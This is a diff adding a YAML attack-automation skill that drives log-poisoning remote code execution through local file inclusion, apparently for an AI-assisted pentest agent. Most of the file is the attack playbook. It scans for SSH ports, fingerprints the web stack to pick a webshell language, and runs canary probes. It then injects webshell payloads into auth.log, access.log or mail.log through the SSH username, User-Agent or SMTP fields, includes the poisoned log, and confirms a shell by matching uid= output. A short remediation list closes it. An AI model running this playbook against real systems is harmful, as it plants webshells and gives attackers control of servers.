@@ -1,0 +1,189 @@
+skill_id: log_poisoning
+name: "日志投毒 RCE (Log Poisoning via LFI)"
+category: web_rce
+phase: foothold
+version: "1.0"
+
+match:
+  rules:
+    - evidence_contains: ["log poisoning"]
+    - evidence_contains: ["file inclusion", "log"]
+    - evidence_contains: ["LFI", "auth.log"]
+    - evidence_contains: ["LFI", "access.log"]
+    - variable_present: ["auth_log_readable"]
+    - variable_present: ["apache_log_readable"]
+    - variable_present: ["nginx_log_readable"]
+
+probes:
+  - id: check_ssh_port
+    description: "检查 SSH 端口, 捕获真实端口号"
+    skip_if:
+      variable_present: ssh_port
+    command: |
+      nmap -sT -p 22,2211,2222,2022,22222 --open {TARGET_IP} 2>/dev/null \
+        | awk '/^[0-9]+\/tcp\s+open\s+ssh/ {split($1,a,"/"); print "SSH_PORT_OPEN:" a[1]}' \
+        || echo "NO_SSH"
+    timeout: 15
+    parse_rules:
+      - if_regex: "SSH_PORT_OPEN:(\\d+)"
+        set: { ssh_available: true, ssh_port: "$1" }
+      - if_regex: "(\\d+)/tcp\\s+open\\s+ssh"
+        set: { ssh_available: true, ssh_port: "$1" }
+
+  - id: probe_webshell_lang
+    description: "识别目标 Web 技术栈（PHP/JSP/ASPX）, 驱动 payload 选择"
+    skip_if:
+      variable_present: webshell_lang
+    command: |
+      ENDPOINT="{ENDPOINT}"
+      BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      HEADERS=$(curl -sI --max-time 5 "$BASE/" 2>/dev/null)
+      COOKIES=$(echo "$HEADERS" | grep -i '^set-cookie:' | tr 'A-Z' 'a-z')
+      EXT_MATCH=$(echo "$ENDPOINT" | grep -oE '\.(php|jsp|jspx|asp|aspx|do|action)([?#]|$)' | head -1 | tr -d '?#')
+
+      LANG="php"
+      WHY="default"
+      if echo "$HEADERS" | grep -qiE 'x-powered-by:\s*php|^Server:.*php|php/'; then
+        LANG=php; WHY="hdr=php"
+      elif echo "$HEADERS" | grep -qiE 'x-powered-by:\s*asp\.net|^Server:.*iis|^x-aspnet-version'; then
+        LANG=aspx; WHY="hdr=iis/aspnet"
+      elif echo "$HEADERS" | grep -qiE '^Server:.*tomcat|^Server:.*jetty|^Server:.*weblogic|^Server:.*jboss|^Server:.*glassfish'; then
+        LANG=jsp; WHY="hdr=jvm-server"
+      elif echo "$COOKIES" | grep -q 'jsessionid='; then
+        LANG=jsp; WHY="cookie=JSESSIONID"
+      elif echo "$COOKIES" | grep -qE 'asp\.net_sessionid|\.aspxauth'; then
+        LANG=aspx; WHY="cookie=ASP.NET"
+      elif echo "$COOKIES" | grep -q 'phpsessid='; then
+        LANG=php; WHY="cookie=PHPSESSID"
+      elif [ "$EXT_MATCH" = ".php" ]; then
+        LANG=php; WHY="ext=.php"
+      elif [ "$EXT_MATCH" = ".jsp" ] || [ "$EXT_MATCH" = ".jspx" ] \
+          || [ "$EXT_MATCH" = ".do" ] || [ "$EXT_MATCH" = ".action" ]; then
+        LANG=jsp; WHY="ext=$EXT_MATCH"
+      elif [ "$EXT_MATCH" = ".asp" ] || [ "$EXT_MATCH" = ".aspx" ]; then
+        LANG=aspx; WHY="ext=$EXT_MATCH"
+      fi
+      echo "[INFO] webshell lang detection: lang=$LANG why=$WHY"
+      echo "WEBSHELL_LANG:$LANG"
+    timeout: 12
+    parse_rules:
+      - if_regex: "WEBSHELL_LANG:(\\w+)"
+        set: { webshell_lang: "$1" }
+
+  - id: canary_probe_ssh
+    description: "Phase 1 -- SSH canary: 注入无害标记到 auth.log, 通过 LFI 验证回显"
+    depends_on: { ssh_available: true }
+    command: "bash {skill_dir}/scripts/canary_ssh.sh {ENDPOINT} {TARGET_IP}"
+    timeout: 45
+    parse_rules:
+      - if_regex: "SSH_CANARY_OK:(.+)"
+        set: { ssh_canary_confirmed: true, ssh_log_path: "$1" }
+
+  - id: canary_probe_ua
+    description: "Phase 1 -- UA canary: 注入唯一 User-Agent 到 access.log, 通过 LFI 验证回显"
+    command: "bash {skill_dir}/scripts/canary_ua.sh {ENDPOINT} {TARGET_IP}"
+    timeout: 45
+    parse_rules:
+      - if_regex: "UA_CANARY_OK:(.+)"
+        set: { ua_canary_confirmed: true, ua_log_path: "$1" }
+
+  - id: canary_probe_smtp
+    description: "Phase 1 -- SMTP canary: MAIL FROM 注入到 mail.log, 通过 LFI 验证回显"
+    command: "bash {skill_dir}/scripts/canary_smtp.sh {ENDPOINT} {TARGET_IP}"
+    timeout: 30
+    parse_rules:
+      - if_regex: "SMTP_CANARY_OK:(.+)"
+        set: { smtp_canary_confirmed: true, smtp_log_path: "$1" }
+
+exploit_paths:
+  - path_id: poison_via_ssh
+    name: "SSH auth.log 日志投毒 RCE（四阶段: canary 已确认）"
+    priority: 1
+    conditions:
+      ssh_canary_confirmed: true
+    steps:
+      - id: deliver_payload_ssh
+        description: "Phase 2 -- 通过 SSH 用户名注入 webshell payload 到已确认的日志文件"
+        command: "bash {skill_dir}/scripts/deliver_ssh.sh {ENDPOINT} {TARGET_IP}"
+        timeout: 30
+        success_criteria:
+          stdout_contains_any: ["PAYLOAD_DELIVERED"]
+        on_success: trigger_rce_ssh
+        on_fail: next_path
+
+      - id: trigger_rce_ssh
+        description: "Phase 3 -- 通过 LFI 包含已投毒的 SSH 日志文件, 触发 RCE"
+        command: "bash {skill_dir}/scripts/trigger_ssh.sh {ENDPOINT} {TARGET_IP}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "(uid=[0-9]+|(?i)(nt authority|iis apppool|administrator))"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_ssh_log_poison"
+
+  - path_id: poison_via_ua
+    name: "HTTP User-Agent access.log 日志投毒 RCE（四阶段: canary 已确认）"
+    priority: 2
+    conditions:
+      ua_canary_confirmed: true
+    steps:
+      - id: deliver_payload_ua
+        description: "Phase 2 -- 通过 User-Agent/Referer 注入 webshell payload 到 access.log"
+        command: "bash {skill_dir}/scripts/deliver_ua.sh {ENDPOINT}"
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["UA_PAYLOAD_DELIVERED"]
+        on_success: trigger_rce_ua
+        on_fail: next_path
+
+      - id: trigger_rce_ua
+        description: "Phase 3 -- 通过 LFI 包含已投毒的 access.log, 触发 RCE"
+        command: "bash {skill_dir}/scripts/trigger_ua.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "(uid=[0-9]+|(?i)(nt authority|iis apppool|administrator))"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_access_log_poison"
+
+  - path_id: poison_via_smtp
+    name: "SMTP mail.log 日志投毒 RCE（四阶段: canary 已确认）"
+    priority: 3
+    conditions:
+      smtp_canary_confirmed: true
+    steps:
+      - id: deliver_payload_smtp
+        description: "Phase 2 -- 通过 SMTP MAIL FROM 注入 webshell payload 到 mail.log"
+        command: "bash {skill_dir}/scripts/deliver_smtp.sh {TARGET_IP}"
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["SMTP_PAYLOAD_DELIVERED"]
+        on_success: trigger_rce_smtp
+        on_fail: next_path
+
+      - id: trigger_rce_smtp
+        description: "Phase 3 -- 通过 LFI 包含已投毒的 mail.log, 触发 RCE"
+        command: "bash {skill_dir}/scripts/trigger_smtp.sh {ENDPOINT}"
+        timeout: 30
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_smtp_log_poison"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. 禁止用户输入直接用于 include/require, 使用白名单限制可包含文件
+  2. 设置 open_basedir 限制文件访问范围
+  3. 关闭 allow_url_include 和 allow_url_fopen
+  4. 限制日志文件权限, 避免 Web 进程可读系统日志
+  5. 修改 SSH 配置限制登录用户名字符集
+  6. 配置 Web 服务器日志格式, 转义或截断特殊字符
